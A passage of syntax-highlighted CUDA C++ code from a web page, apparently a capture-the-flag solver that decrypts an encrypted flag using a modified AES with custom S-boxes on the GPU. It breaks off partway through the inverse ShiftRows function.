class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cuda_runtime.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;device_launch_parameters.h&quot;</span></span></span><br><span class="line"><span class="comment">// å¯†æ–‡</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> EncFlag[<span class="number">48</span>];</span><br><span class="line"><span class="comment">// é€†sbox</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> inv_S[<span class="number">256</span>];</span><br><span class="line"><span class="comment">// sbox</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="comment">// è½®å¸¸é‡</span></span><br><span class="line">__constant__ <span class="type">uint32_t</span> rcon[<span class="number">10</span>];</span><br><span class="line"><span class="comment">// hashæ˜æ–‡æ¨¡æ¿</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> hash_plaintext_template[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> inv_S_user[<span class="number">256</span>] &#123; </span><br><span class="line"><span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>,</span><br><span class="line"><span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>,</span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>,</span><br><span class="line"><span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>,</span><br><span class="line"><span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>,</span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>,</span><br><span class="line"><span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>,</span><br><span class="line"><span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>,</span><br><span class="line"><span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>,</span><br><span class="line"><span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>,</span><br><span class="line"><span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> S_user[<span class="number">256</span>]&#123; </span><br><span class="line"><span class="number">0x3f</span>, <span class="number">0x1e</span>, <span class="number">0xfc</span>, <span class="number">0x3d</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0xf0</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0x54</span>, <span class="number">0x6e</span>, <span class="number">0xfb</span>, <span class="number">0x42</span>,</span><br><span class="line"><span class="number">0x29</span>, <span class="number">0xe8</span>, <span class="number">0x23</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa2</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xd4</span>, <span class="number">0xba</span>, <span class="number">0xb5</span>, <span class="number">0x84</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x5c</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xf2</span>, <span class="number">0x22</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0x89</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0xef</span>, <span class="number">0x67</span>,</span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xbd</span>, <span class="number">0xd0</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xb4</span>, <span class="number">0x55</span>, <span class="number">0xc5</span>, <span class="number">0xc8</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0xd8</span>, <span class="number">0x01</span>, <span class="number">0x5a</span>, <span class="number">0x2e</span>, <span class="number">0xed</span>, <span class="number">0x91</span>, <span class="number">0xff</span>, <span class="number">0x15</span>, <span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x24</span>, <span class="number">0x72</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x56</span>, <span class="number">0xbf</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xc7</span>, <span class="number">0x95</span>, <span class="number">0x05</span>, <span class="number">0xb6</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0xb3</span>, <span class="number">0x10</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x43</span>, <span class="number">0xbb</span>,</span><br><span class="line"><span class="number">0x62</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>, <span class="number">0xa3</span>, <span class="number">0xbe</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span class="number">0xdc</span>, <span class="number">0xc9</span>, <span class="number">0x8f</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0xe7</span>, <span class="number">0x17</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0xae</span>, <span class="number">0x83</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0x27</span>, <span class="number">0x4a</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x2c</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>,</span><br><span class="line"><span class="number">0x85</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0xf4</span>, <span class="number">0xfd</span>, <span class="number">0x3c</span>, <span class="number">0xf1</span>, <span class="number">0x45</span>, <span class="number">0x1f</span>, <span class="number">0x5b</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0x09</span>, <span class="number">0xea</span>, <span class="number">0xee</span>, <span class="number">0x0c</span>, <span class="number">0xd6</span>, <span class="number">0x61</span>, <span class="number">0xc6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xb9</span>, <span class="number">0x7f</span>, <span class="number">0xec</span>, <span class="number">0x94</span>,</span><br><span class="line"><span class="number">0xce</span>, <span class="number">0xa9</span>, <span class="number">0x97</span>, <span class="number">0x3b</span>, <span class="number">0xda</span>, <span class="number">0x8e</span>, <span class="number">0xe5</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0xad</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0xcb</span>, <span class="number">0xb7</span>, <span class="number">0x1c</span>, <span class="number">0x7a</span>, <span class="number">0xf6</span>, <span class="number">0x87</span>, <span class="number">0xcd</span>, <span class="number">0x4f</span>, <span class="number">0x9f</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0xde</span>, <span class="number">0xc3</span>,</span><br><span class="line"><span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0xfa</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x90</span>, <span class="number">0xdf</span>, <span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xe0</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x6b</span>, <span class="number">0x0b</span>, <span class="number">0x3e</span>, <span class="number">0x1d</span>, <span class="number">0xe1</span>, <span class="number">0x58</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0x78</span>, <span class="number">0x0e</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0xdd</span>, <span class="number">0x9b</span>, <span class="number">0xd2</span>, <span class="number">0x19</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xdb</span>, <span class="number">0xfe</span>, <span class="number">0x60</span>, <span class="number">0x13</span>, <span class="number">0x4c</span>, <span class="number">0xcc</span>, <span class="number">0xf3</span>, <span class="number">0xa5</span>, <span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x96</span>, <span class="number">0x80</span>, <span class="number">0xe6</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x9e</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x0a</span>, <span class="number">0xcf</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x06</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> rcon_user[<span class="number">10</span>]&#123;</span><br><span class="line"> <span class="number">0x01000000UL</span>, <span class="number">0x02000000UL</span>, <span class="number">0x04000000UL</span>, <span class="number">0x08000000UL</span>, <span class="number">0x10000000UL</span>,</span><br><span class="line"> <span class="number">0x20000000UL</span>, <span class="number">0x40000000UL</span>, <span class="number">0x80000000UL</span>, <span class="number">0x1B000000UL</span>, <span class="number">0x36000000UL</span> </span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y) do &#123; \</span></span><br><span class="line"><span class="meta">    uint32_t _temp = 0; \</span></span><br><span class="line"><span class="meta">    _temp  = ((uint32_t)((y)[0] &amp; 0xFF) &lt;&lt; 24); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[1] &amp; 0xFF) &lt;&lt; 16); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[2] &amp; 0xFF) &lt;&lt; 8); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[3] &amp; 0xFF)); \</span></span><br><span class="line"><span class="meta">    (x) = _temp; \</span></span><br><span class="line"><span class="meta">&#125; while(0) </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y) \</span></span><br><span class="line"><span class="meta">   (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \</span></span><br><span class="line"><span class="meta">       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n)  (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint32_t</span> <span class="title">MixWord</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">const</span> <span class="type">uint8_t</span>* LocalS)</span> </span>&#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> word;</span><br><span class="line"><span class="type">uint8_t</span> bytes[<span class="number">4</span>];</span><br><span class="line">&#125; in, out;</span><br><span class="line"></span><br><span class="line">in.word = x;</span><br><span class="line"></span><br><span class="line">out.bytes[<span class="number">0</span>] = LocalS[in.bytes[<span class="number">1</span>]];  <span class="comment">// BYTE(x, 1)</span></span><br><span class="line">out.bytes[<span class="number">1</span>] = LocalS[in.bytes[<span class="number">0</span>]];  <span class="comment">// BYTE(x, 0)</span></span><br><span class="line">out.bytes[<span class="number">2</span>] = LocalS[in.bytes[<span class="number">3</span>]];  <span class="comment">// BYTE(x, 3)</span></span><br><span class="line">out.bytes[<span class="number">3</span>] = LocalS[in.bytes[<span class="number">2</span>]];  <span class="comment">// BYTE(x, 2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ((<span class="type">uint32_t</span>)out.bytes[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> * key, <span class="type">uint32_t</span> keyLen, <span class="type">void</span> * aesKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>];</span><br><span class="line"><span class="type">int</span> Nr;</span><br><span class="line">&#125;AesKey;</span><br><span class="line">AesKey* p_aesKey = (AesKey*)aesKey;</span><br><span class="line"><span class="type">uint32_t</span>* w = p_aesKey-&gt;eK;</span><br><span class="line"><span class="type">uint32_t</span>* v = p_aesKey-&gt;dK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">LOAD32H</span>(w[i], key + <span class="number">4</span> * i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ <span class="built_in">MIX</span>(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">w += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w = p_aesKey-&gt;eK + <span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">v[i] = w[i];</span><br><span class="line">&#125;</span><br><span class="line">w -= <span class="number">4</span>;</span><br><span class="line">v += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">loadStateArray</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span>* in)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[j][i] = *in++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">storeStateArray</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">uint8_t</span>* out)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">*out++ = state[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">addRoundKey</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">k[i][j] = (<span class="type">uint8_t</span>)<span class="built_in">BYTE</span>(key[j], <span class="number">3</span> - i);</span><br><span class="line">state[i][j] ^= k[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invSubBytes</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> LocalInvS[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">LocalInvS[i] = inv_S[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[i][j] = LocalInvS[state[i][j]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invShiftRows</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">temp[i][j] = state[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">state[<span class="number">0</span>][<span class="number">0</span>] = temp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">1</span>] = temp[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">2</span>] = temp[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">3</span>] = temp[<span class="number">0</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">1</span>][<span class="number">0</span>] = temp[<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">1</span>] = temp[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">2</span>] = temp[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">3</span>] = temp[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">2</span>][<span class="number">0</span>] = temp[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">1</span>] = temp[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">2</span>] = temp[<span class="number">2</span>][<span 